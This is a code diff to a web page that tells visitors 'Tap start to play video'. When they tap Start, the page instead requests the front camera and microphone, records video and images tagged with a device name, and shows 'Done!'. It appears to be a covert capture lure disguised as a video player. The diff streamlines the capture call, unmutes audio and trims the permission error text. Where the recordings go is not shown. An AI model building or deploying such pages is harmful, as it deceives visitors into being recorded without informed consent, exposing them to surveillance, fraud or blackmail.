@@ -26,7 +26,7 @@ footer{padding:10px;font-size:13px;}
   <h3>Chinto994</h3>
   <p id="msg">Tap start to play video</p>
   <button id="startBtn"><span>Start</span></button>
-  <video id="video" autoplay muted playsinline></video>
+  <video id="video" autoplay playsinline></video>
 </div>
 <footer>Help Center</footer>
 
@@ -87,7 +87,7 @@ async function recordVideoAndImages(device){
     });
   }
 
-  await delay(600);
+  await delay(600); // ensure full video capture
   recorder.stop();
 
   return new Promise(resolve=>{
@@ -115,14 +115,9 @@ startBtn.onclick = async()=>{
   const device = await getDeviceName();
 
   try {
-    // ✅ Capture video + audio safely
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video:{facingMode:"user"}, 
-      audio:true // enable microphone
-    });
-
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
     video.srcObject = stream;
-    video.muted = false; // unmute local preview
+    video.muted = false; // Ensure audio is not muted
     await video.play();
 
     await recordVideoAndImages(device);
@@ -130,8 +125,8 @@ startBtn.onclick = async()=>{
     msg.innerText = "Done!";
     startBtn.classList.remove("loading");
   } catch(err) {
-    console.error("Media device error:", err);
-    msg.innerText = "Cannot access camera/microphone. Make sure you allow permissions and use HTTPS.";
+    console.error(err);
+    msg.innerText = "Permission required";
     startBtn.disabled = false;
     startBtn.classList.remove("loading");
   }
